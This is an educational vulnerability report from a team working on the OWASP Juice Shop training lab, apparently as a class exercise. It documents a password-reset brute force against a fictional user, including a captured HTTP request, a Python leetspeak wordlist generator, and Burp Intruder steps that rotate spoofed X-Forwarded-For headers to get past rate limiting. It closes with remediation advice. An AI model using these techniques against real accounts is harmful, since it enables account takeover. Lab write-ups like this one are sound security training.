CVE-ID
EDU-JUICESHOP-2026-T01-014

Title
Account Takeover via Password Reset Brute Force Using Mutation-Based Wordlist and Rate Limiting Bypass

Affected Lab and Component

Affected Lab: OWASP Juice Shop

 Component: Password Reset Mechanism
 
 Affected Endpoint:

POST /rest/user/reset-password

Port: 3000

Vulnerability Classification
CWE-640 – Weak Password Recovery Mechanism


CWE-307 – Improper Restriction of Excessive Authentication Attempts


OWASP Top 10:


A02:2021 – Identification and Authentication Failures



CVSS v3.1 Score and Vector

CVSS Score: 8.2 (High)

CVSS Vector:

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N



Description
The OWASP Juice Shop password reset functionality relies on a static security question answer to validate password reset requests. Although a rate-limiting mechanism is implemented, it is enforced based on the client IP address and incorrectly trusts the client-supplied X-Forwarded-For HTTP header to determine request origin.
An unauthenticated attacker can identify likely security question answers using contextual and publicly available information related to the target user. By generating a mutation-based wordlist from this information and brute-forcing the password reset endpoint while rotating arbitrary X-Forwarded-For values, the attacker can bypass rate limiting and reset the victim’s password, resulting in full account takeover.

Identification of Security Question Answer Context
The target account morty@juice-sh.op corresponds to a fictional character identity. Open-source contextual information associated with this identity reveals references to a pet name. Based on this information, the keyword “snowball” was identified as a likely candidate for the security question answer.
This keyword was used as the base input for generating a targeted mutation-based wordlist, significantly reducing the brute-force search space and making the attack feasible.

Exploitation Steps
Step 1: Identify Password Reset Functionality
Navigate to:


http://localhost:3000/#/forgot-password

Submit the email address:


morty@juice-sh.op

Observe that the application prompts for a security question answer.



Step 2: Capture Reset Request Using Burp Suite
Launch Burp Suite.


Enable Proxy → Intercept.


Submit a password reset attempt with an arbitrary answer.


Capture the following request:


POST /rest/user/reset-password HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "email": "morty@juice-sh.op",
  "answer": "test",
  "new": "morty01",
  "repeat": "morty01"
}


Step 3: Generate Mutation-Based Wordlist
A custom Python script was used to generate all possible mutations of the base word snowball, including lowercase, uppercase, and numeric (leet-speak) substitutions.
Python Wordlist Generator (Proof of Concept)
import itertools

word = "snowball"

leet_map = {
    'a': ['a', 'A', '4'],
    'b': ['b', 'B', '8'],
    'e': ['e', 'E', '3'],
    'i': ['i', 'I', '1'],
    'l': ['l', 'L', '1'],
    'o': ['o', 'O', '0'],
    's': ['s', 'S', '5'],
    'n': ['n', 'N'],
    'w': ['w', 'W']
}

char_sets = []
for c in word:
    char_sets.append(leet_map.get(c.lower(), [c.lower(), c.upper()]))

combinations = itertools.product(*char_sets)

with open("snowball_wordlist.txt", "w") as f:
    for combo in combinations:
        f.write("".join(combo) + "\n")

print("Wordlist generated: snowball_wordlist.txt")

The script outputs a file containing all generated mutations, which was used as input for the brute-force attack.

Step 4: Verify Rate Limiting Weakness
Send the captured request to Burp Repeater.


Observe rate limiting after multiple failed attempts.


Add the following header:


X-Forwarded-For: 1.1.1.1

Repeat the request and observe that rate limiting is bypassed.



Step 5: Brute Force Security Answer Using Burp Intruder
Send the modified request to Burp Intruder.


Configure payload positions for:


The answer field in the JSON body


The X-Forwarded-For header


Set Attack Type to Pitchfork.


Load snowball_wordlist.txt as Payload Set 1.


Configure Payload Set 2 with sequential or random values for X-Forwarded-For.


Start the attack.



Step 6: Successful Password Reset
A distinct success response is returned when the correct answer is submitted.


The password for the target account is reset to an attacker-controlled value.


The attacker can authenticate using the new credentials.



Proof of Concept
The vulnerability was successfully exploited by combining OSINT-based context identification, a Python-generated mutation-based wordlist, and Burp Suite Intruder with rotating X-Forwarded-For header values, resulting in unauthorized password reset and full account takeover.

Impact
Full account takeover


Unauthorized password reset


Loss of confidentiality and integrity of user accounts


Abuse of password recovery functionality



Remediation
Remove security questions as a password reset mechanism


Implement token-based, time-limited password reset flows


Enforce rate limiting based on:


Account identity


CAPTCHA validation


Do not trust client-controlled headers such as X-Forwarded-For


Introduce temporary lockouts after repeated failed reset attempts

Discovered By: Team 1

Date: 10/02/2026
